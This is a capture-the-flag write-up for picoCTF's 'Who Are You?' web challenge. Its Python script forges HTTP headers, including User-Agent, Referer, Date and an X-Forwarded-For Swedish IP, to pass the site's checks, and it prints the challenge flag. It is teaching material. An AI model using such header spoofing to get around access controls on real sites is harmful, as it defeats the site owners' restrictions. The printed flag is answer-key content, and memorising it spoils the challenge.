# Who Are You?

## Who are you?

AUTHOR:  MADSTACKS

### Description

Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn  [http://mercury.picoctf.net:46199/](http://mercury.picoctf.net:46199/)

<details>
<summary>Hint</summary>
It ain't much, but it's an RFC: https://datatracker.ietf.org/doc/html/rfc2616
</details>

### Solution

```py
import requests
import re

URL = 'http://mercury.picoctf.net:46199'

HEADERS = {
    # 1. Only people who use the official PicoBrowser are allowed on this site!
    # https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent
    'User-Agent': 'PicoBrowser', 

    # 2. I don't trust users visiting from another site.
    # https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer
    'Referer': URL,
    
    # 3. Sorry, this site only worked in 2018.
    # https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Date
    'Date': 'Wed, 21 Oct 2018 07:28:00 GMT',
    
    # 4. I don't trust users who can be tracked.
    # https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/DNT
    'DNT': '1',
    
    # 5. This website is only for people from Sweden.
    # https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For
    'X-Forwarded-For': '109.75.224.0', # Random IP From Google Search
    
    # 6. You're in Sweden but you don't speak Swedish? 
    # https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Accept-Language
    'Accept-Language': 'sv',  
    
    # What can I say except, you are welcome
}

resp = requests.get(URL, headers=HEADERS).text
flag = re.search(r"<b>(picoCTF.*)</b>", resp).group(1)
print(flag)
```
::: tip Flag
`picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_8d5d8d77}`
:::